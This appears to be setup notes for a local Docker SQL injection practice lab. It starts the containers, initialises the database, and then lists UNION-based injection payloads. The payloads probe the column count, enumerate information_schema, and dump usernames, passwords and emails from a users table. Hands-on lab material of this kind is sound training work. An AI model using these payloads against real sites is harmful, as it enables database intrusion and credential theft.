# Start all three containers apache, php and mysql
docker-compose up
Notice how these 3 daemons run on PID 1 inside of each container, this is considered a best-practice for building containers!

# Test connection
curl localhost:8080

Notice now in the logs that the apache container and php containers both respond to the request, as desired:
php_1     | 172.18.0.4 -  16/Jul/2018:02:09:22 +0000 "GET /index.php" 200
apache_1  | 172.18.0.1 - - [16/Jul/2018:02:09:22 +0000] "GET / HTTP/1.1" 200 108

# Enter the mysql container to initialize database
docker exec -it sql_injection_mysql_1 mysql -u root -p -e "Use injectionAttack; $(cat ./mysql/db-init.sql)"

';-- 

pillows' UNION (SELECT 1,2,3,4,5 FROM dual);-- 

pillows' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3, 4, 5 FROM information_schema.tables);-- 

pillows' UNION (SELECT COLUMN_NAME, 2, 3, 4, 5 FROM information_schema.columns WHERE TABLE_NAME = 'users');-- 

pillows' UNION (SELECT id, username, psswd, email, description FROM users);-- 